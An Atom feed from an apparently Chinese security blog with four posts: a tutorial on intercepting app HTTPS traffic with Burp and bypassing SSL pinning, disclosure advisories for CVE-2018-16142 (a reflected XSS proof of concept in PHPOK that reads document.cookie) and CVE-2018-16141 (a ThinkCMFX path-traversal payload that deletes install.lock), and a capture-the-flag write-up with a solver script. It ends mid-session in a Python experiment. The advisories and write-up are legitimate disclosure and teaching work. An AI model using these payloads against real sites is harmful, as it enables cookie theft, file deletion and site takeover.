<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Unothing</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://unothing.github.io/"/>
  <updated>2019-05-10T13:45:53.119Z</updated>
  <id>https://unothing.github.io/</id>
  
  <author>
    <name>Unothing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Catch Me If You Can</title>
    <link href="https://unothing.github.io/posts/https/"/>
    <id>https://unothing.github.io/posts/https/</id>
    <published>2018-10-12T09:28:28.000Z</published>
    <updated>2019-05-10T13:45:53.119Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="0x00">0x00</span></h2><p>本文主要是介绍如何使用Burp去抓取各种情况下的APP流量。顺带简单介绍了下HTTPS和SSL pinning。</p><h2><span id="0x01-http">0x01 HTTP</span></h2><p>HTTP 协议（HyperText Transfer Protocol，超文本传输协议）：是客户端浏览器或其他程序与Web服务器之间的应用层通信协议 。</p><p>客户端和服务器之间是明文传输，在网络传输中无任何安全保障。<br>但是应用可以自己制定加密规则，对传输的内容进行加密。</p><p>由于HTTP协议未对通信双方进行任何的验证，所以黑客可以轻松在链路中充当中间者，任意修改往来的传输内容。<br>Burp抓取普通的http的协议内容就是把Burp设为代理，这样所有的流量就会从Burp流经，Burp此时就是一个中间人，由于传输所有的信息都是明文的，所以可以修改任意往来数据包。</p><p><img src="httphack.png" alt="http中间人攻击"></p><p><a href="https://tech.upyun.com/article/192/HTTPS%E7%B3%BB%E5%88%97%E5%B9%B2%E8%B4%A7%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTPS%20%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="external">HTTP向HTTPS的演化进程</a></p><h2><span id="0x02-https">0x02 HTTPS</span></h2><p>HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：可以理解为HTTP+SSL/TLS， 即HTTP下加入SSL层。SSL工作在会话层（负责会话的建立与维持），经过加密后仅IP，端口和域名是明文的。</p><p><img src="httpvshttps.png" alt="http和https的对比"></p><p>TLS（Transport Layer Security，传输层安全）是由SSL（Secure Socket Layer，安全套接字层）演化而来，目前使用最广泛的是TLS 1.1、TLS 1.2。TLS 1.3还在草案阶段。</p><p><img src="https.jpg" alt="https加密过程"></p><p>HTTPS先是请求服务器的证书，然后根据<strong>服务器返回的证书</strong>进行验证。<br><strong>证书来源可信</strong>且<strong>证书签名验证通过</strong>后就会使用证书提供的公钥使用RSA<strong>非对称算法</strong>去加密随机生成的AES对称加密算法的密钥。<br>服务器使用私钥解密获取对称加密的密钥。<br>之后所有的数据包往来都是建立在这个<strong>对称加密</strong>之上，和非对称加密无关。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">不全程使用非对称加密主要原因，一是和加密效率有关，另一点，这样保证了每次交流中的秘钥都不同，不存在由于固定密钥遭到破解的问题。</div></pre></td></tr></table></figure><h3><span id="这样就安全了吗">这样就安全了吗？</span></h3><p>显然不是，因为对于客户端来说证书是从外部提供的，所有的验证参数都是由该证书提供的，所以，就可以在链接建立前由中间者提供证书，从而造成中间人攻击。</p><p><img src="httpshack.jpg" alt="https中间人攻击"></p><p>Burp抓取HTTPS的数据包就是先把自己的证书添加到系统的信任根证书颁发机构中，</p><p><img src="root_cert.jpg" alt="添加信任根证书颁发机构"></p><p>然后客户端把代理的Burp当作服务器，使用Burp提供的证书对数据包进行加密，<br>Burp利用自己的私钥把数据包解密还原后，再利用真正的服务器的证书对数据包进行加密。</p><h2><span id="0x03-ssl-pinning">0x03 SSL pinning</span></h2><p>上面可以看到普通的HTTPS是会信任系统中的根证书颁发机构的，而这个机构用户可以手动添加，导致可抓到HTTPS的数据包。<br>于是有些软件就会使用SSL pinning。<br>SSL pinning技术常用于APP中，主要就是将目标服务器的SSL证书放到app里面。在进行网络通信前，先判断服务器返回的证书是否和本地APP中存有的一致，如果不一致就会中断连接。</p><p>所以当使用Burp去抓取某些APP的数据包时，APP里会显示无网络连接之类的网络连接错误提示。</p><p><img src="connfail.jpg" alt=""></p><p>有两种破解的思路：</p><ol><li>逆向APP，把伪造的证书替换到APP中或干脆删掉SSL pinning验证代码，然后重新打包签名。</li><li>在系统中HOOK用于进行SLL pinning的代码，使所有的证书验证都返回<code>true</code>。</li></ol><p>说实话，我两种都不会。。。<br><img src="notech.jpg" alt=""></p><p>但是有大佬会啊，而且工具都写好了 </p><p>在<strong>系统已经<code>root</code></strong>的情况下，使用<code>Xposed  + JustTrustMe</code>就可轻松实现第2种方法。<br>看清楚Android版本下载对应的<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="external"><code>Xposed Installer</code></a>，然后点击框架，进去后选择安装<code>Xposed</code>。<br><img src="install.jpg" alt="安装Xposed"><br>再在手机中安装<a href="https://github.com/Fuzion24/JustTrustMe/releases/tag/v.2" target="_blank" rel="external"><code>JustTrustMe</code></a>，点击上图中的模块，进去就可选择启用<code>JustTrustMe</code>模块了，重启后生效。<br><img src="JustTrustMe.jpg" alt="启用JustTrustMe"><br>简单的安装后，在手机已经安装Burp证书的情况下，就可以轻松抓取APP中的HTTPS数据包了。</p><p>再提供两篇文章：<br><a href="https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/" target="_blank" rel="external">四种绕过Android SSL pinning的方法</a><br><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/" target="_blank" rel="external">四种绕过IOS SSL pinning的方法</a></p><h2><span id="0x04-双向验证">0x04 双向验证</span></h2><p>既然上面都是单向验证不安全，那么采用双向验证呢？<br>其实仔细想想也不是无法解决的问题。</p><p>上面的方法已经解决了客户端对服务器端的验证，现在只要解决服务器对客户端的验证就好了。<br>也不复杂，只要提取出软件中的客户端证书，然后让代理工具用这个证书来和服务器端进行通信就好了。</p><p>这种情况目前还没碰到，但找到一篇参考文章：<a href="https://www.secpulse.com/archives/54027.html" target="_blank" rel="external">如何突破双向证书认证防护</a>。<br>先在APP的资源中找到使用的证书，如果需要证书口令，就要去逆向回来的代码中找口令，如果APP混淆过了就更麻烦了，所以作者提供了一个思路，去找历史版本中没有混淆加固的版本，这样阅读起来就会方便很多。<br>然后让抓包工具加载这个提取出的证书就可以实现抓包了。</p><p>针对Android APP的逆向，个人比较推荐<code>jadx</code>，在我目前的实践中，使用起来还是比较方便实用的。</p><h3><span id="0x05-自有协议">0x05 自有协议</span></h3><p>某些手机APP使用了自有协议如微信等，具体表现就是使用工具抓包时，抓不到APP的数据包，而且APP仍能自由通信，不会有任何影响。</p><p>曾照这篇文章<a href="http://www.freebuf.com/articles/network/158589.html" target="_blank" rel="external">经验分享 | Burpsuite抓取非HTTP流量</a>实验过，但没有成功，后续碰到再补充。</p><p>还有个方法是使用<code>iptables</code>来转发流量。</p><h3><span id="references">References</span></h3><p><a href="https://tech.upyun.com/article/192/HTTPS%E7%B3%BB%E5%88%97%E5%B9%B2%E8%B4%A7%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTPS%20%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="external">HTTPS系列干货（一）：HTTPS 原理详解</a><br><a href="http://www.nsfocus.com.cn/upload/contents/2015/07/2015_07241441569651.pdf" target="_blank" rel="external">对抗Android SSL Pinning</a><br><a href="https://www.jianshu.com/p/22b56d977825" target="_blank" rel="external">有关ssl-pinning的总结</a><br><a href="https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/" target="_blank" rel="external">四种绕过Android SSL pinning的方法</a><br><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/" target="_blank" rel="external">四种绕过IOS SSL pinning的方法</a><br><a href="https://github.com/summitt/Burp-Non-HTTP-Extension" target="_blank" rel="external">NoPE Proxy</a><br><a href="https://www.secpulse.com/archives/54027.html" target="_blank" rel="external">如何突破双向证书认证防护</a><br><a href="http://www.freebuf.com/articles/network/158589.html" target="_blank" rel="external">经验分享 | Burpsuite抓取非HTTP流量</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;0x00&quot;&gt;0x00&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;本文主要是介绍如何使用Burp去抓取各种情况下的APP流量。顺带简单介绍了下HTTPS和SSL pinning。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-http&quot;&gt;0x01 HTTP&lt;/span
      
    
    </summary>
    
      <category term="相关知识" scheme="https://unothing.github.io/categories/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="https ssl-pinning 抓包" scheme="https://unothing.github.io/tags/https-ssl-pinning-%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>PHPOK4.8.278 XSS</title>
    <link href="https://unothing.github.io/posts/phpok48278/"/>
    <id>https://unothing.github.io/posts/phpok48278/</id>
    <published>2018-08-29T14:34:32.000Z</published>
    <updated>2018-10-17T09:16:10.997Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="cve-id">CVE ID</span></h3><p>CVE-2018-16142</p><h3><span id="official-website">Official website:</span></h3><p><a href="https://www.phpok.com/" target="_blank" rel="external">https://www.phpok.com/</a></p><h3><span id="download-link">Download link:</span></h3><p><a href="https://www.phpok.com/23987.html" target="_blank" rel="external">https://www.phpok.com/23987.html</a></p><h3><span id="version">Version:</span></h3><p>PHPOK4.8.278</p><h3><span id="vulnerability-type">Vulnerability type:</span></h3><p>XSS</p><h3><span id="description">Description:</span></h3><p>PHPOK4.8.278 has an Reflected XSS vulnerability in framework/www/login_control.php.</p><h3><span id="file">File:</span></h3><p>framework/www/login_control.php</p><h3><span id="detail">Detail</span></h3><p><img src="code.png" alt=""></p><p>In ok_f() function , the program doesn’t filter the parameter $_back .<br>Attacker can make an XSS vulnerability.</p><p>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://example.com/index.php?c=login&amp;_back=javascript:alert(document.cookie);</div></pre></td></tr></table></figure></p><p>After a logined user clicks the link or waits for 2 second , the demo will alert cookie.</p><p><img src="1.png" alt=""></p><p>If the user doesn’t login , the website will redirect to login page , then it will alert cookie after login.</p><p><img src="2.png" alt=""><br><img src="3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;cve-id&quot;&gt;CVE ID&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;CVE-2018-16142&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;official-website&quot;&gt;Official website:&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https
      
    
    </summary>
    
      <category term="代码审计" scheme="https://unothing.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="phpok" scheme="https://unothing.github.io/tags/phpok/"/>
    
  </entry>
  
  <entry>
    <title>Thinkcmfx2.2.3 File Deletion Vulnerability</title>
    <link href="https://unothing.github.io/posts/thinkcmfx223/"/>
    <id>https://unothing.github.io/posts/thinkcmfx223/</id>
    <published>2018-08-29T14:10:14.000Z</published>
    <updated>2018-10-17T09:15:57.826Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="cve-id">CVE ID</span></h3><p>CVE-2018-16141</p><h3><span id="official-website">Official website:</span></h3><p><a href="https://www.thinkcmf.com/" target="_blank" rel="external">https://www.thinkcmf.com/</a></p><h3><span id="download-link">Download link:</span></h3><p><a href="http://www.mycodes.net/do/job.php?job=down_encode&amp;fid=45&amp;id=7058&amp;rid=7088&amp;i_id=4759&amp;mid=106&amp;field=softurl&amp;ti=0" target="_blank" rel="external">http://www.mycodes.net/do/job.php?job=down_encode&amp;fid=45&amp;id=7058&amp;rid=7088&amp;i_id=4759&amp;mid=106&amp;field=softurl&amp;ti=0</a></p><h3><span id="version">Version:</span></h3><p>ThinkCMFX2.2.3</p><h3><span id="vulnerability-type">Vulnerability type:</span></h3><p>File Manipulation</p><h3><span id="description">Description:</span></h3><p>Thinkcmfx2.2.3 has an arbitrary file deletion vulnerability in the \application\User\Controller\ProfileController.class.php.</p><p>A member user can delete any file in the windows server.</p><h3><span id="file">File:</span></h3><p>\application\User\Controller\ProfileController.class.php</p><h3><span id="detail">Detail</span></h3><p><img src="code.png" alt=""></p><p>In function do_avatar , the program doesn’t verify the post parameter ‘imgurl’ , so we can deliver a file path to imgurl . Then we post the data twice to trigger sp_delete_avatar function which can delete any file .<br>In line 176 , the program delete any ‘/’ , but in windows we can use ‘\’ to bypass it.</p><p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/ThinkCMFX/index.php?g=user&amp;m=profile&amp;a=do_avatar</div><div class="line">POST:imgurl=..\..\..\data\install.lock</div></pre></td></tr></table></figure></p><p>First register a member test</p><p>Then use the poc twice , we can delete the install.lock file.</p><p>Now we can reinstall the website ! </p><p><img src="reinstall.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;cve-id&quot;&gt;CVE ID&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;CVE-2018-16141&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;official-website&quot;&gt;Official website:&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https
      
    
    </summary>
    
      <category term="代码审计" scheme="https://unothing.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="thinkcmf" scheme="https://unothing.github.io/tags/thinkcmf/"/>
    
  </entry>
  
  <entry>
    <title>2018-starctf</title>
    <link href="https://unothing.github.io/posts/2018-starctf/"/>
    <id>https://unothing.github.io/posts/2018-starctf/</id>
    <published>2018-05-07T12:08:15.000Z</published>
    <updated>2018-05-30T12:37:48.538Z</updated>
    
    <content type="html"><![CDATA[<p>就随便看了2题，做个简单的记录。</p><h3><span id="0x01-web-simpleweb">0x01 Web-simpleweb</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">var net = require(&apos;net&apos;);</div><div class="line"></div><div class="line">flag=&apos;fake_flag&apos;;</div><div class="line"></div><div class="line">var server = net.createServer(function(socket) &#123;</div><div class="line">socket.on(&apos;data&apos;, (data) =&gt; &#123; </div><div class="line">//m = data.toString().replace(/[\n\r]*$/, &apos;&apos;);</div><div class="line">ok = true;</div><div class="line">arr = data.toString().split(&apos; &apos;);</div><div class="line">arr = arr.map(Number);</div><div class="line">if (arr.length != 5) </div><div class="line">ok = false;</div><div class="line">arr1 = arr.slice(0);</div><div class="line">arr1.sort();</div><div class="line">for (var i=0; i&lt;4; i++)</div><div class="line">if (arr1[i+1] == arr1[i] || arr[i] &lt; 0 || arr1[i+1] &gt; 127)</div><div class="line">ok = false;</div><div class="line">arr2 = []</div><div class="line">for (var i=0; i&lt;4; i++)</div><div class="line">arr2.push(arr1[i] + arr1[i+1]);</div><div class="line">val = 0;</div><div class="line">for (var i=0; i&lt;4; i++)</div><div class="line">val = val * 0x100 + arr2[i];</div><div class="line">if (val != 0x23332333)</div><div class="line">ok = false;</div><div class="line">if (ok)</div><div class="line">socket.write(flag+&apos;\n&apos;);</div><div class="line">else</div><div class="line">socket.write(&apos;nope\n&apos;);</div><div class="line">&#125;);</div><div class="line">//socket.write(&apos;Echo server\r\n&apos;);</div><div class="line">//socket.pipe(socket);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">HOST = &apos;0.0.0.0&apos;</div><div class="line">PORT = 23333</div><div class="line"></div><div class="line">server.listen(PORT, HOST);</div></pre></td></tr></table></figure><p>题意比较简单，输入5个数，经过sort()后，前4个要大于0，后4个要小于127，相邻的不能相等，经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for (var i=0; i&lt;4; i++)</div><div class="line">    arr2.push(arr1[i] + arr1[i+1]);</div><div class="line">val = 0;</div><div class="line">for (var i=0; i&lt;4; i++)</div><div class="line">val = val * 0x100 + arr2[i];</div></pre></td></tr></table></figure></p><p>迭代后要等于0x23332333。<br>如果5个数都是整数，则等价于以下条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">有5个在0-127之间的并按大小顺序排好的不同的数，</div><div class="line">a1+a2 == 0x23</div><div class="line">a2+a3 == 0x33</div><div class="line">a3+a4 == 0x23</div><div class="line">a4+a5 == 0x33</div></pre></td></tr></table></figure></p><p>但是可以在数学层面简单证明整数是不能实现这个要求的，于是考虑用小数。<br>算了一早上，终于手动算出5个数。</p><table><thead><tr><th>0x1</th><th>0x21.EF</th><th>0x22.AC</th><th>0x65.89</th><th>0x98.77</th></tr></thead><tbody><tr><td> 1</td><td>33.93359375</td><td>34.671875</td><td>101.53515625</td><td>152.46484375</td></tr></tbody></table><p>心里还想着明明是数学题，怎么放到web里了。<br>但当输入结果过去的时候，发现竟然错了！手动验证一遍，没错。<br>开始调试代码。终于发现<br><strong>sort()是按字符串比较大小的！！！</strong><br>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[21,3,1].sort()</div><div class="line">(3) [1, 21, 3]</div></pre></td></tr></table></figure></p><p>也就意味着上面那个数学证明是错的。。。<br>然后花了3分钟就找到了5个满足要求的整数。。。<br><code>15, 20, 31, 4, 47</code></p><h3><span id="0x02-ppc-magic_number">0x02 PPC-magic_number</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Given n(1&lt;=n&lt;=14) integers a1,a2,...,an in interval [0,1024), you should determine them by sending several queries.</div><div class="line"></div><div class="line">For each query, you can ask &quot;how many integers are in interval [l,r)?&quot; through stdout in format &quot;? l r&quot; where 0&lt;=l&lt;r&lt;=1024, and you will recieve an integer through stdin as the answer.</div><div class="line"></div><div class="line">Finally, if all the integers are determined, you should output them in arbitrary order and in format &quot;! a1 a2 ... an&quot;.</div><div class="line"></div><div class="line">Please notice that some of the integers can be the same and that you can send no more than 99 queries in each level.</div></pre></td></tr></table></figure><p>用二分法，但是限制了查询次数少于100，对于n&gt;=10时就不能对每个数都二分一次。<br>主要根据返回的范围内数字个数进行优化。<br>脚本源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">#-*- encoding:utf-8 -*-</div><div class="line"></div><div class="line">import telnetlib</div><div class="line">import re</div><div class="line">import time</div><div class="line"></div><div class="line">host = &quot;47.89.18.224&quot;</div><div class="line">port = &quot;10011&quot;</div><div class="line"></div><div class="line">def Guess(a,level_num):</div><div class="line">#判断是否计算出所有a</div><div class="line">solved = 0</div><div class="line">for i in range(level_num):</div><div class="line">if a[i][1] - a[i][0] == 1:</div><div class="line">solved += 1</div><div class="line">if solved == level_num:</div><div class="line">question = &quot;!&quot;</div><div class="line">for i in range(level_num):</div><div class="line">question = question + &quot; &quot;+ str(a[i][0])</div><div class="line">question = question + &quot;\n&quot;</div><div class="line">print question,</div><div class="line">tn.write(question)</div><div class="line">#tn.read_until(&quot;-------------\n&quot;)</div><div class="line">#answer = tn.read_until(&quot;\n&quot;)</div><div class="line">return &quot;level &quot; + str(level_num - 1) + &quot; done!&quot;,a</div><div class="line"></div><div class="line">same_all = 1</div><div class="line">for i in range(solved,level_num-1):</div><div class="line">if a[i][0] == a[i+1][0] and a[i][1] == a[i+1][1]:</div><div class="line">same_all += 1</div><div class="line">else:</div><div class="line">break</div><div class="line"></div><div class="line">print &quot;solved:&quot;,solved,&quot;same_all:&quot;,same_all</div><div class="line"></div><div class="line">question = &quot;? %d %d \n&quot;%(a[solved][0],(a[solved][1]+a[solved][0])/2)</div><div class="line">print question,</div><div class="line">tn.write(question)</div><div class="line">#time.sleep(1)</div><div class="line">same = int(tn.read_until(&quot;\n&quot;,5))</div><div class="line"></div><div class="line">print same</div><div class="line"></div><div class="line">for i in range(solved,solved+same):</div><div class="line">a[i][1] = (a[i][0]+a[i][1])/2</div><div class="line"></div><div class="line"></div><div class="line">for i in range(solved+same,solved+same_all):</div><div class="line">t = (a[i][0]+a[i][1])/2</div><div class="line">#a[i][1] = ((a[i][1] - a[i][0])/2) + a[i][1]</div><div class="line">a[i][0] = t</div><div class="line"></div><div class="line">print a</div><div class="line">return Guess(a,level_num)</div><div class="line"></div><div class="line"></div><div class="line">def one_level():</div><div class="line">#time.sleep(1)</div><div class="line">print tn.read_until(&quot;---\n&quot;,5)</div><div class="line">#time.sleep(1)</div><div class="line">level = tn.read_until(&quot;\n&quot;,5)</div><div class="line">level_num = int(re.match(r&apos;Level (.*) : n = (.*)&apos;,level).group(2))</div><div class="line"></div><div class="line">#a = [[0]*2]*level_num#日！！！浅拷贝</div><div class="line">a = [[0 for i in range(2)] for i in range(level_num)]</div><div class="line">for i in range(level_num):</div><div class="line">a[i][0] = 0</div><div class="line">a[i][1] = 1024</div><div class="line"></div><div class="line">print level</div><div class="line">print Guess(a,level_num)</div><div class="line"></div><div class="line"></div><div class="line">tn = telnetlib.Telnet(host,port)</div><div class="line">time.sleep(1)</div><div class="line">tn.read_until(&quot;each level.\n&quot;)</div><div class="line">for i in range(14):</div><div class="line">one_level()</div><div class="line">#time.sleep(1)</div><div class="line"></div><div class="line">tn.close()</div></pre></td></tr></table></figure></p><p>写脚本时碰到的坑主要就是：<br>python生成多维数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a = [[0]*2]*level_num</div></pre></td></tr></table></figure></p><p>这样生成的数组，是<strong>浅拷贝</strong>。所有的列是同时修改的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; a = [[0]*2]*3</div><div class="line">&gt;&gt;&gt; a</div><div class="line">[[0, 0], [0, 0], [0, 0]]</div><div class="line">&gt;&gt;&gt; a[0][0]=1</div><div class="line">&gt;&gt;&gt; a</div><div class="line">[[1, 0], [1, 0], [1, 0]]</div></pre></td></tr></table></figure></p><p>正确的写法应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a = [[0 for i in range(2)] for i in range(level_num)]</div></pre></td></tr></table></figure></p><p><strong>浅拷贝</strong>与<strong>深拷贝</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">浅拷贝相当于引用，只是多了一个指针指向同一个地址。即，所有的a[*][0]都是对a[0][0]的一个引用，所以当修改a[0][0]时，所有的a[*][0]都会改变。</div><div class="line">深拷贝就是常说的复制。又开辟了一块空间存储相同内容的数据。地址也就不会相同了。</div><div class="line">&gt;&gt;&gt; b = [[0 for i in range(2)] for i in range(3)]</div><div class="line">&gt;&gt;&gt; b</div><div class="line">[[0, 0], [0, 0], [0, 0]]</div><div class="line">&gt;&gt;&gt; b[0][0]=1</div><div class="line">&gt;&gt;&gt; b</div><div class="line">[[1, 0], [0, 0], [0, 0]]</div></pre></td></tr></table></figure></p><p>但同时，好像又发现了点有意思的东西。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line"># 给b[0][0]赋完值，其他数组元素地址一样？？？黑人问号</div><div class="line">&gt;&gt;&gt; id(b[0][0])</div><div class="line">32407976L</div><div class="line">&gt;&gt;&gt; id(b[0][1])</div><div class="line">32408000L</div><div class="line">&gt;&gt;&gt; id(b[1][0])</div><div class="line">32408000L</div><div class="line">&gt;&gt;&gt; id(b[2][0])</div><div class="line">32408000L</div><div class="line"># 改个值看看</div><div class="line">&gt;&gt;&gt; b[1][0]=1</div><div class="line">&gt;&gt;&gt; id(b[1][0])</div><div class="line">32407976L</div><div class="line"># 看看0,1的地址</div><div class="line">&gt;&gt;&gt; id(0)</div><div class="line">32408000L</div><div class="line">&gt;&gt;&gt; id(1)</div><div class="line">32407976L# 变量地址和对应的值有关</div><div class="line"># id(a[0][1]) == id(b[0][1]) == id(0)</div><div class="line">&gt;&gt;&gt; id(a[0][1])</div><div class="line">32408000L</div><div class="line"># 随机字符串的地址会变</div><div class="line">&gt;&gt;&gt; id(&apos;sdafdas&apos;)</div><div class="line">43318728L</div><div class="line">&gt;&gt;&gt; id(&apos;sdafdas&apos;)</div><div class="line">43318648L</div><div class="line">&gt;&gt;&gt; id(&apos;sdafdas&apos;)</div><div class="line">43318408L</div><div class="line"># 凭啥下面的又不变？</div><div class="line">&gt;&gt;&gt; id(&apos;1&apos;)</div><div class="line">42434648L</div><div class="line">&gt;&gt;&gt; id(&apos;1&apos;)</div><div class="line">42434648L</div><div class="line">&gt;&gt;&gt; id(&apos;1&apos;)</div><div class="line">42434648L</div><div class="line">&gt;&gt;&gt; id(888345)</div><div class="line">42992176L</div><div class="line">&gt;&gt;&gt; id(888345)</div><div class="line">42992176L</div><div class="line">&gt;&gt;&gt; id(888345)</div><div class="line">42992176L</div><div class="line"># 为啥会共用一个地址？</div><div class="line">&gt;&gt;&gt; id(8883459999)</div><div class="line">32268656L</div><div class="line">&gt;&gt;&gt; 